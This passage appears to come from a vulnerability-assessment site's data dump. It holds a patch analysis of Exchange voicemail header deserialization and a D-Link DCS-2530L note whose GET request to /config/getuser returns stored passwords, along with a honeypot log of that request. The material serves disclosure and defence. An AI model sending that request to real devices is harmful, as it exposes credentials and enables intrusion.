\t\t\t\t\t{\r\n \t\t\t\t\t\tpipelineContext = new PartnerTranscriptionRequestPipelineContext(submissionHelper);\r\n-\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t}\r\n \t\t\t\t}\r\n \t\t\t\telse if (num2 != 1356218075U)\r\n \t\t\t\t{\r\n \t\t\t\t\tif (num2 != 2525024257U)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tif (num2 == 3974407582U)\r\n \t\t\t\t\t\t{\r\n \t\t\t\t\t\t\tif (text == \"SMTPVoiceMail\")\r\n \t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\tif (num < PipelineWorkItem.ProcessedCountMax - 1)\r\n \t\t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\t\tpipelineContext = new VoiceMessagePipelineContext(submissionHelper);\r\n-\t\t\t\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\tpipelineContext = new MissedCallPipelineContext(submissionHelper);\r\n-\t\t\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t}\r\n \t\t\t\t\t}\r\n \t\t\t\t\telse if (text == \"HealthCheck\")\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tpipelineContext = new HealthCheckPipelineContext(Path.GetFileNameWithoutExtension(headerFile));\r\n-\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t}\r\n \t\t\t\t}\r\n \t\t\t\telse if (text == \"OutgoingCallLog\")\r\n \t\t\t\t{\r\n \t\t\t\t\tpipelineContext = new OutgoingCallLogPipelineContext(submissionHelper);\r\n-\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t}\r\n \t\t\t\tthrow new HeaderFileArgumentInvalidException(string.Format(CultureInfo.InvariantCulture, \"{0}: {1}\", \"MessageType\", text));\r\n-\t\t\t\tIL_62E:\r\n+\t\t\t\tIL_694:\r\n \t\t\t\tif (text2 == null)\r\n \t\t\t\t{\r\n \t\t\t\t\ttext2 = Guid.NewGuid().ToString();\r\n \t\t\t\t\texDateTime = ExDateTime.Now;\r\n \t\t\t\t}\r\n \t\t\t\tpipelineContext.HeaderFileName = headerFile;\r\n \t\t\t\tpipelineContext.processedCount = num;\r\n \t\t\t\tif (contactInfo != null)\r\n \t\t\t\t{\r\n \t\t\t\t\tIUMResolveCaller iumresolveCaller = pipelineContext as IUMResolveCaller;\r\n \t\t\t\t\tif (iumresolveCaller != null)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tiumresolveCaller.ContactInfo = contactInfo;\r\n \t\t\t\t\t}\r\n \t\t\t\t}\r\n \t\t\t\tpipelineContext.sentTime = exDateTime;\r\n \t\t\t\tpipelineContext.messageID = text2;\r\n \t\t\t\tpipelineContext.WriteHeaderFile(headerFile);\r\n \t\t\t\tresult = pipelineContext;\r\n \t\t\t}\r\n-\t\t\tcatch (IOException ex)\r\n+\t\t\tcatch (IOException ex2)\r\n \t\t\t{\r\n \t\t\t\tCallIdTracer.TraceDebug(ExTraceGlobals.VoiceMailTracer, 0, \"Failed to parse the header file {0} because its not closed by thread creating the file.  Error={1}\", new object[]\r\n \t\t\t\t{\r\n \t\t\t\t\theaderFile,\r\n-\t\t\t\t\tex\r\n+\t\t\t\t\tex2\r\n \t\t\t\t});\r\n \t\t\t\tif (pipelineContext != null)\r\n \t\t\t\t{\r\n \t\t\t\t\tpipelineContext.Dispose();\r\n \t\t\t\t\tpipelineContext = null;\r\n \t\t\t\t}\r\n \t\t\t\tresult = null;\r\n \t\t\t}\r\n-\t\t\tcatch (InvalidObjectGuidException ex2)\r\n+\t\t\tcatch (InvalidObjectGuidException ex3)\r\n \t\t\t{\r\n \t\t\t\tCallIdTracer.TraceWarning(ExTraceGlobals.VoiceMailTracer, 0, \"Couldn't find the recipient for this message. Error={0}\", new object[]\r\n \t\t\t\t{\r\n-\t\t\t\t\tex2\r\n+\t\t\t\t\tex3\r\n \t\t\t\t});\r\n \t\t\t\tif (pipelineContext != null)\r\n \t\t\t\t{\r\n \t\t\t\t\tpipelineContext.Dispose();\r\n \t\t\t\t\tpipelineContext = null;\r\n \t\t\t\t}\r\n \t\t\t\tthrow;\r\n \t\t\t}\r\n-\t\t\tcatch (InvalidTenantGuidException ex3)\r\n+\t\t\tcatch (InvalidTenantGuidException ex4)\r\n \t\t\t{\r\n \t\t\t\tCallIdTracer.TraceWarning(ExTraceGlobals.VoiceMailTracer, 0, \"Couldn't find the tenant for this message. Error={0}\", new object[]\r\n \t\t\t\t{\r\n-\t\t\t\t\tex3\r\n+\t\t\t\t\tex4\r\n \t\t\t\t});\r\n \t\t\t\tif (pipelineContext != null)\r\n \t\t\t\t{\r\n \t\t\t\t\tpipelineContext.Dispose();\r\n \t\t\t\t\tpipelineContext = null;\r\n \t\t\t\t}\r\n \t\t\t\tthrow;\r\n \t\t\t}\r\n-\t\t\tcatch (NonUniqueRecipientException ex4)\r\n+\t\t\tcatch (NonUniqueRecipientException ex5)\r\n \t\t\t{\r\n \t\t\t\tCallIdTracer.TraceWarning(ExTraceGlobals.VoiceMailTracer, 0, \"Multiple objects found for the recipient. Error={0}\", new object[]\r\n \t\t\t\t{\r\n-\t\t\t\t\tex4\r\n+\t\t\t\t\tex5\r\n \t\t\t\t});\r\n \t\t\t\tif (pipelineContext != null)\r\n \t\t\t\t{\r\n \t\t\t\t\tpipelineContext.Dispose();\r\n \t\t\t\t\tpipelineContext = null;\r\n \t\t\t\t}\r\n \t\t\t\tthrow;\r\n \t\t\t}\r\n \t\t\treturn result;\r\n \t\t}\r\n\r\n \t\tinternal abstract void WriteCustomHeaderFields(StreamWriter headerStream);\r\n\r\n \t\tpublic abstract string GetMailboxServerId();\r\n\r\n \t\tpublic abstract string GetRecipientIdForThrottling();\r\n\r\n \t\tinternal virtual void SaveMessage()\r\n \t\t{\r\n \t\t\tthis.WriteHeaderFile(this.HeaderFileName);\r\n \t\t}\r\n\r\n \t\tprotected override void InternalDispose(bool disposing)\r\n \t\t{\r\n \t\t\tif (disposing)\r\n \t\t\t{\r\n \t\t\t\tCallIdTracer.TraceDebug(ExTraceGlobals.VoiceMailTracer, this.GetHashCode(), \"PipelineContext.Dispose() called\", Array.Empty<object>());\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tprotected override DisposeTracker InternalGetDisposeTracker()\r\n \t\t{\r\n \t\t\treturn DisposeTracker.Get<PipelineContext>(this);\r\n \t\t}\r\n\r\n \t\tprotected virtual void SetMessageProperties()\r\n \t\t{\r\n \t\t\tIUMResolveCaller iumresolveCaller = this as IUMResolveCaller;\r\n \t\t\tif (iumresolveCaller != null)\r\n \t\t\t{\r\n \t\t\t\tExAssert.RetailAssert(iumresolveCaller.ContactInfo != null, \"ResolveCallerStage should always set the ContactInfo.\");\r\n \t\t\t\tUMSubscriber umsubscriber = ((IUMCAMessage)this).CAMessageRecipient as UMSubscriber;\r\n \t\t\t\tUMDialPlan dialPlan = (umsubscriber != null) ? umsubscriber.DialPlan : null;\r\n \t\t\t\tMicrosoft.Exchange.UM.UMCommon.PhoneNumber pstnCallbackTelephoneNumber = this.CallerId.GetPstnCallbackTelephoneNumber(iumresolveCaller.ContactInfo, dialPlan);\r\n \t\t\t\tthis.messageToSubmit.From = iumresolveCaller.ContactInfo.CreateParticipant(pstnCallbackTelephoneNumber, this.CultureInfo);\r\n \t\t\t\tXsoUtil.SetVoiceMessageSenderProperties(this.messageToSubmit, iumresolveCaller.ContactInfo, dialPlan, this.CallerId);\r\n \t\t\t\tthis.messageToSubmit.InternetMessageId = BoomerangHelper.FormatInternetMessageId(this.MessageID, Utils.GetHostFqdn());\r\n \t\t\t\tthis.messageToSubmit[ItemSchema.SentTime] = this.SentTime;\r\n \t\t\t}\r\n \t\t\tthis.messageToSubmit.AutoResponseSuppress = AutoResponseSuppress.All;\r\n \t\t\tthis.messageToSubmit[MessageItemSchema.CallId] = this.helper.CallId;\r\n \t\t\tIUMCAMessage iumcamessage = this as IUMCAMessage;\r\n \t\t\tif (iumcamessage != null)\r\n \t\t\t{\r\n \t\t\t\tthis.MessageToSubmit.Recipients.Add(new Participant(iumcamessage.CAMessageRecipient.ADRecipient));\r\n \t\t\t\tIADSystemConfigurationLookup iadsystemConfigurationLookup = ADSystemConfigurationLookupFactory.CreateFromOrganizationId(iumcamessage.CAMessageRecipient.ADRecipient.OrganizationId);\r\n \t\t\t\tthis.MessageToSubmit.Sender = new Participant(iadsystemConfigurationLookup.GetMicrosoftExchangeRecipient());\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tprotected void WriteHeaderFile(string headerFileName)\r\n \t\t{\r\n \t\t\tusing (FileStream fileStream = File.Open(headerFileName, FileMode.Create, FileAccess.Write, FileShare.None))\r\n \t\t\t{\r\n \t\t\t\tusing (StreamWriter streamWriter = new StreamWriter(fileStream))\r\n \t\t\t\t{\r\n \t\t\t\t\tif (this.MessageType != null)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tstreamWriter.WriteLine(\"MessageType : \" + this.MessageType);\r\n \t\t\t\t\t}\r\n \t\t\t\t\tstreamWriter.WriteLine(\"ProcessedCount : \" + this.processedCount.ToString(CultureInfo.InvariantCulture));\r\n \t\t\t\t\tif (this.messageID != null)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tstreamWriter.WriteLine(\"MessageID : \" + this.messageID);\r\n \t\t\t\t\t}\r\n \t\t\t\t\tif (this.sentTime.Year != 1)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tstreamWriter.WriteLine(\"SentTime : \" + this.sentTime.ToString(CultureInfo.InvariantCulture));\r\n \t\t\t\t\t}\r\n \t\t\t\t\tthis.WriteCommonHeaderFields(streamWriter);\r\n \t\t\t\t\tthis.WriteCustomHeaderFields(streamWriter);\r\n \t\t\t\t}\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tprotected virtual void WriteCommonHeaderFields(StreamWriter headerStream)\r\n \t\t{\r\n \t\t\tif (!this.CallerId.IsEmpty)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"CallerId : \" + this.CallerId.ToDial);\r\n \t\t\t}\r\n \t\t\tif (this.helper.RecipientName != null)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"RecipientName : \" + this.helper.RecipientName);\r\n \t\t\t}\r\n \t\t\tif (this.helper.RecipientObjectGuid != Guid.Empty)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"RecipientObjectGuid : \" + this.helper.RecipientObjectGuid.ToString());\r\n \t\t\t}\r\n \t\t\tif (this.helper.CallerName != null)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"CallerNAme : \" + this.helper.CallerName);\r\n \t\t\t}\r\n \t\t\tif (!string.IsNullOrEmpty(this.helper.CallerIdDisplayName))\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"CallerIdDisplayName : \" + this.helper.CallerIdDisplayName);\r\n \t\t\t}\r\n \t\t\tif (this.CallerAddress != null)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"CallerAddress : \" + this.CallerAddress);\r\n \t\t\t}\r\n \t\t\tif (this.helper.CultureInfo != null)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"CultureInfo : \" + this.helper.CultureInfo);\r\n \t\t\t}\r\n \t\t\tif (this.helper.CallId != null)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"CallId : \" + this.helper.CallId);\r\n \t\t\t}\r\n \t\t\tIUMResolveCaller iumresolveCaller = this as IUMResolveCaller;\r\n \t\t\tif (iumresolveCaller != null && iumresolveCaller.ContactInfo != null)\r\n \t\t\t{\r\n \t\t\t\theaderStream.WriteLine(\"ContactInfo : \" + CommonUtil.Base64Serialize(iumresolveCaller.ContactInfo));\r\n \t\t\t}\r\n \t\t\theaderStream.WriteLine(\"TenantGuid : \" + this.helper.TenantGuid.ToString());\r\n \t\t}\r\n\r\n \t\tprotected UMRecipient CreateRecipientFromObjectGuid(Guid objectGuid, Guid tenantGuid)\r\n \t\t{\r\n \t\t\treturn UMRecipient.Factory.FromADRecipient<UMRecipient>(this.CreateADRecipientFromObjectGuid(objectGuid, tenantGuid));\r\n \t\t}\r\n\r\n \t\tprotected ADRecipient CreateADRecipientFromObjectGuid(Guid objectGuid, Guid tenantGuid)\r\n \t\t{\r\n \t\t\tif (objectGuid == Guid.Empty)\r\n \t\t\t{\r\n \t\t\t\tthrow new HeaderFileArgumentInvalidException(\"ObjectGuid is empty\");\r\n \t\t\t}\r\n \t\t\tADRecipient adrecipient = ADRecipientLookupFactory.CreateFromTenantGuid(tenantGuid).LookupByObjectId(new ADObjectId(objectGuid));\r\n \t\t\tif (adrecipient == null)\r\n \t\t\t{\r\n \t\t\t\tCallIdTracer.TraceDebug(ExTraceGlobals.VoiceMailTracer, 0, \"Could not find recipient {0}\", new object[]\r\n \t\t\t\t{\r\n \t\t\t\t\tobjectGuid.ToString()\r\n \t\t\t\t});\r\n \t\t\t\tthrow new InvalidObjectGuidException(objectGuid.ToString());\r\n \t\t\t}\r\n \t\t\treturn adrecipient;\r\n \t\t}\r\n\r\n \t\tprotected UMDialPlan InitializeCallerIdAndTryGetDialPlan(UMRecipient recipient)\r\n \t\t{\r\n \t\t\tUMDialPlan umdialPlan = null;\r\n \t\t\tif (this.CallerId.UriType == UMUriType.E164 && recipient.ADRecipient.UMRecipientDialPlanId != null)\r\n \t\t\t{\r\n \t\t\t\tumdialPlan = ADSystemConfigurationLookupFactory.CreateFromADRecipient(recipient.ADRecipient).GetDialPlanFromId(recipient.ADRecipient.UMRecipientDialPlanId);\r\n \t\t\t\tif (umdialPlan != null && umdialPlan.CountryOrRegionCode != null)\r\n \t\t\t\t{\r\n \t\t\t\t\tthis.helper.CallerId = this.helper.CallerId.Clone(umdialPlan);\r\n \t\t\t\t}\r\n \t\t\t}\r\n \t\t\treturn umdialPlan;\r\n \t\t}\r\n\r\n \t\tprotected string GetMailboxServerIdHelper()\r\n \t\t{\r\n \t\t\tIUMCAMessage iumcamessage = this as IUMCAMessage;\r\n \t\t\tif (iumcamessage != null)\r\n \t\t\t{\r\n \t\t\t\tUMMailboxRecipient ummailboxRecipient = iumcamessage.CAMessageRecipient as UMMailboxRecipient;\r\n \t\t\t\tif (ummailboxRecipient != null)\r\n \t\t\t\t{\r\n \t\t\t\t\treturn ummailboxRecipient.ADUser.ServerLegacyDN;\r\n \t\t\t\t}\r\n \t\t\t}\r\n \t\t\treturn \"af360a7e-e6d4-494a-ac69-6ae14896d16b\";\r\n \t\t}\r\n\r\n \t\tprotected string GetRecipientIdHelper()\r\n \t\t{\r\n \t\t\tIUMCAMessage iumcamessage = this as IUMCAMessage;\r\n \t\t\tif (iumcamessage != null)\r\n \t\t\t{\r\n \t\t\t\tUMMailboxRecipient ummailboxRecipient = iumcamessage.CAMessageRecipient as UMMailboxRecipient;\r\n \t\t\t\tif (ummailboxRecipient != null)\r\n \t\t\t\t{\r\n \t\t\t\t\treturn ummailboxRecipient.ADUser.DistinguishedName;\r\n \t\t\t\t}\r\n \t\t\t}\r\n \t\t\treturn \"455e5330-ce1f-48d1-b6b1-2e318d2ff2c4\";\r\n \t\t}\r\n\r\n \t\tprivate MessageItem messageToSubmit;\r\n\r\n \t\tprivate SubmissionHelper helper;\r\n\r\n \t\tprivate string messageType;\r\n\r\n \t\tprivate CultureInfo cultureInfo;\r\n\r\n \t\tprivate string headerFileName;\r\n\r\n \t\tprivate int processedCount;\r\n\r\n \t\tprivate string messageID;\r\n\r\n \t\tprivate ExDateTime sentTime;\r\n+\r\n+\t\tprivate static Type[] contactInfoDeserializationAllowList = new Type[]\r\n+\t\t{\r\n+\t\t\ttypeof(Version),\r\n+\t\t\ttypeof(Guid),\r\n+\t\t\ttypeof(PropTag),\r\n+\t\t\ttypeof(ContactInfo),\r\n+\t\t\ttypeof(ADContactInfo),\r\n+\t\t\ttypeof(FoundByType),\r\n+\t\t\ttypeof(ADUser),\r\n+\t\t\ttypeof(ADPropertyBag),\r\n+\t\t\ttypeof(ValidationError),\r\n+\t\t\ttypeof(ADPropertyDefinition),\r\n+\t\t\ttypeof(ADObjectId),\r\n+\t\t\ttypeof(ExchangeObjectVersion),\r\n+\t\t\ttypeof(ExchangeBuild),\r\n+\t\t\ttypeof(MultiValuedProperty<string>),\r\n+\t\t\ttypeof(LocalizedString),\r\n+\t\t\ttypeof(ProxyAddressCollection),\r\n+\t\t\ttypeof(SmtpAddress),\r\n+\t\t\ttypeof(RecipientDisplayType),\r\n+\t\t\ttypeof(RecipientTypeDetails),\r\n+\t\t\ttypeof(ElcMailboxFlags),\r\n+\t\t\ttypeof(UserAccountControlFlags),\r\n+\t\t\ttypeof(ObjectState),\r\n+\t\t\ttypeof(DirectoryBackendType),\r\n+\t\t\ttypeof(MServPropertyDefinition),\r\n+\t\t\ttypeof(MbxPropertyDefinition),\r\n+\t\t\ttypeof(MbxPropertyDefinitionFlags),\r\n+\t\t\ttypeof(OrganizationId),\r\n+\t\t\ttypeof(PartitionId),\r\n+\t\t\ttypeof(SmtpProxyAddress),\r\n+\t\t\ttypeof(SmtpProxyAddressPrefix),\r\n+\t\t\ttypeof(ByteQuantifiedSize),\r\n+\t\t\ttypeof(Unlimited<ByteQuantifiedSize>),\r\n+\t\t\ttypeof(List<ValidationError>),\r\n+\t\t\ttypeof(ADMultiValuedProperty<TextMessagingStateBase>),\r\n+\t\t\ttypeof(ADMultiValuedProperty<ADObjectId>),\r\n+\t\t\ttypeof(StoreObjectId),\r\n+\t\t\ttypeof(StoreObjectType),\r\n+\t\t\ttypeof(EntryIdProvider),\r\n+\t\t\ttypeof(SimpleContactInfoBase),\r\n+\t\t\ttypeof(MultipleResolvedContactInfo),\r\n+\t\t\ttypeof(CallerNameDisplayContactInfo),\r\n+\t\t\ttypeof(PersonalContactInfo),\r\n+\t\t\ttypeof(DefaultContactInfo),\r\n+\t\t\ttypeof(UMDialPlan),\r\n+\t\t\ttypeof(UMEnabledFlags),\r\n+\t\t\tType.GetType(\"Microsoft.Exchange.Data.ByteQuantifiedSize+QuantifierProvider, Microsoft.Exchange.Data\"),\r\n+\t\t\tType.GetType(\"System.UnitySerializationHolder, mscorlib\"),\r\n+\t\t\tType.GetType(\"Microsoft.Exchange.Data.ByteQuantifiedSize+Quantifier,Microsoft.Exchange.Data\"),\r\n+\t\t\tType.GetType(\"Microsoft.Exchange.Data.PropertyBag+ValuePair, Microsoft.Exchange.Data\"),\r\n+\t\t\tType.GetType(\"System.Collections.Generic.List`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\"),\r\n+\t\t\ttypeof(DialByNamePrimaryEnum),\r\n+\t\t\ttypeof(DialByNameSecondaryEnum),\r\n+\t\t\ttypeof(AudioCodecEnum),\r\n+\t\t\ttypeof(UMUriType),\r\n+\t\t\ttypeof(UMSubscriberType),\r\n+\t\t\ttypeof(UMGlobalCallRoutingScheme),\r\n+\t\t\ttypeof(UMVoIPSecurityType),\r\n+\t\t\ttypeof(SystemFlagsEnum),\r\n+\t\t\ttypeof(EumProxyAddress),\r\n+\t\t\ttypeof(EumProxyAddressPrefix)\r\n+\t\t};\r\n \t}\r\n }\r\n```\r\n\r\nThe patch appears to add and use a typed allowlist for deserialization of a voicemail's contact info, which is found in a header file alongside the voicemail itself. ~~Other seemingly unprotected deserializations can be seen in the same class.~~ (I think it's just XML parsing.) My suspicion is that [CVE-2021-26858](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858) or [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) could be used to write a malicious header file to `C:\\Program Files\\Microsoft\\Exchange Server\\V15\\UnifiedMessaging\\voicemail`, but it's entirely possible a crafted voicemail could be sent instead. While I haven't developed a PoC yet, I do have a good idea how to, assuming the patch analysis is correct. Better-resourced attackers should be able to exploit this issue in considerably less time.\r\n\r\nThe specifically patched code can be seen below:\r\n\r\n```cs\r\n[snip]\r\n\t\t\t\t\t\t\t\t\telse\r\n\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"ContactInfo\"))\r\n\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\tException ex = null;\r\n\t\t\t\t\t\t\t\t\t\ttry\r\n\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\ttry\r\n\t\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\t\tusing (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(array[1])))\r\n\t\t\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tcontactInfo = (ContactInfo)TypedBinaryFormatter.DeserializeObject(memoryStream, PipelineContext.contactInfoDeserializationAllowList, null, true);\r\n\t\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t\tcatch (ArgumentNullException ex)\r\n\t\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t\tcatch (SerializationException ex)\r\n\t\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t\tcatch (Exception ex)\r\n\t\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\tfinally\r\n\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\tif (ex != null)\r\n\t\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\t\tCallIdTracer.TraceDebug(ExTraceGlobals.VoiceMailTracer, 0, \"Failed to get contactInfo from header file {0} with Error={1}\", new object[]\r\n\t\t\t\t\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\t\t\t\t\theaderFile,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tex\r\n\t\t\t\t\t\t\t\t\t\t\t\t});\r\n\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t}\r\n[snip]\r\n```\r\n\r\n```cs\r\n[snip]\r\n\t\tprivate static Type[] contactInfoDeserializationAllowList = new Type[]\r\n\t\t{\r\n\t\t\ttypeof(Version),\r\n\t\t\ttypeof(Guid),\r\n\t\t\ttypeof(PropTag),\r\n\t\t\ttypeof(ContactInfo),\r\n\t\t\ttypeof(ADContactInfo),\r\n\t\t\ttypeof(FoundByType),\r\n\t\t\ttypeof(ADUser),\r\n\t\t\ttypeof(ADPropertyBag),\r\n\t\t\ttypeof(ValidationError),\r\n\t\t\ttypeof(ADPropertyDefinition),\r\n\t\t\ttypeof(ADObjectId),\r\n\t\t\ttypeof(ExchangeObjectVersion),\r\n\t\t\ttypeof(ExchangeBuild),\r\n\t\t\ttypeof(MultiValuedProperty<string>),\r\n\t\t\ttypeof(LocalizedString),\r\n\t\t\ttypeof(ProxyAddressCollection),\r\n\t\t\ttypeof(SmtpAddress),\r\n\t\t\ttypeof(RecipientDisplayType),\r\n\t\t\ttypeof(RecipientTypeDetails),\r\n\t\t\ttypeof(ElcMailboxFlags),\r\n\t\t\ttypeof(UserAccountControlFlags),\r\n\t\t\ttypeof(ObjectState),\r\n\t\t\ttypeof(DirectoryBackendType),\r\n\t\t\ttypeof(MServPropertyDefinition),\r\n\t\t\ttypeof(MbxPropertyDefinition),\r\n\t\t\ttypeof(MbxPropertyDefinitionFlags),\r\n\t\t\ttypeof(OrganizationId),\r\n\t\t\ttypeof(PartitionId),\r\n\t\t\ttypeof(SmtpProxyAddress),\r\n\t\t\ttypeof(SmtpProxyAddressPrefix),\r\n\t\t\ttypeof(ByteQuantifiedSize),\r\n\t\t\ttypeof(Unlimited<ByteQuantifiedSize>),\r\n\t\t\ttypeof(List<ValidationError>),\r\n\t\t\ttypeof(ADMultiValuedProperty<TextMessagingStateBase>),\r\n\t\t\ttypeof(ADMultiValuedProperty<ADObjectId>),\r\n\t\t\ttypeof(StoreObjectId),\r\n\t\t\ttypeof(StoreObjectType),\r\n\t\t\ttypeof(EntryIdProvider),\r\n\t\t\ttypeof(SimpleContactInfoBase),\r\n\t\t\ttypeof(MultipleResolvedContactInfo),\r\n\t\t\ttypeof(CallerNameDisplayContactInfo),\r\n\t\t\ttypeof(PersonalContactInfo),\r\n\t\t\ttypeof(DefaultContactInfo),\r\n\t\t\ttypeof(UMDialPlan),\r\n\t\t\ttypeof(UMEnabledFlags),\r\n\t\t\tType.GetType(\"Microsoft.Exchange.Data.ByteQuantifiedSize+QuantifierProvider, Microsoft.Exchange.Data\"),\r\n\t\t\tType.GetType(\"System.UnitySerializationHolder, mscorlib\"),\r\n\t\t\tType.GetType(\"Microsoft.Exchange.Data.ByteQuantifiedSize+Quantifier,Microsoft.Exchange.Data\"),\r\n\t\t\tType.GetType(\"Microsoft.Exchange.Data.PropertyBag+ValuePair, Microsoft.Exchange.Data\"),\r\n\t\t\tType.GetType(\"System.Collections.Generic.List`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\"),\r\n\t\t\ttypeof(DialByNamePrimaryEnum),\r\n\t\t\ttypeof(DialByNameSecondaryEnum),\r\n\t\t\ttypeof(AudioCodecEnum),\r\n\t\t\ttypeof(UMUriType),\r\n\t\t\ttypeof(UMSubscriberType),\r\n\t\t\ttypeof(UMGlobalCallRoutingScheme),\r\n\t\t\ttypeof(UMVoIPSecurityType),\r\n\t\t\ttypeof(SystemFlagsEnum),\r\n\t\t\ttypeof(EumProxyAddress),\r\n\t\t\ttypeof(EumProxyAddressPrefix)\r\n\t\t};\r\n[snip]\r\n```",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "93a3922f-a634-4c19-a5de-60177e5f7b5a",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "d99a6214-1073-40aa-8ab4-79eebb4a08a7",
      "created": "2021-03-04T00:03:45.013313Z",
      "revisionDate": "2021-03-08T18:28:41.735416Z",
      "document": "## Vulnerability\r\n\r\nThe D-LInk DCS-2530L is an IP Camera. This means it is more likely to be a target for botnets / IoT auto exploitation rather than anything else. \r\n\r\nTriggering the exploit is very simple its just a `GET` request to the `/config/getuser?index=0\"` endpoint and it returns the user|password combinations in clear text. \r\n\r\nThis can be paired with a second vulnerability reported at the same time, an authenticated command injection vuln, to gain access. See the exploited section below for more details. \r\n\r\n## resources\r\n\r\nThe original tweets have been deleted but archive.org has them\r\n\r\nhttps://web.archive.org/web/20200617135938/https://twitter.com/Dogonsecurity/status/1273251236167516161\r\n\r\n\r\n## In the wild. \r\n\r\nMy honeypots picked up a couple of pings on this, I am assuming automated scanning by some botnets.\r\n\r\n```\r\n{\r\n    \"http_headers\": {\r\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\r\n        \"Accept-Encoding\": \"gzip, deflate\",\r\n        \"Accept-Language\": \"en-GB,en;q=0.5\",\r\n        \"Connection\": \"close\",\r\n        \"Host\": \"REDACTED:8080\",\r\n        \"Upgrade-Insecure-Requests\": \"1\",\r\n        \"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\r\n    },\r\n    \"http_host\": \"REDACTED:8080\",\r\n    \"http_method\": \"GET\",\r\n    \"http_path\": \"/config/getuser\",\r\n    \"http_post\": {},\r\n    \"http_query\": \"/config/getuser?index=0\",\r\n    \"http_remote\": \"205.185.122.102\",\r\n    \"http_scheme\": \"http\",\r\n    \"http_version\": \"HTTP/1.1\",\r\n    \"src_ip\": \"205.185.122.102\"\r\n}\r\n```",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
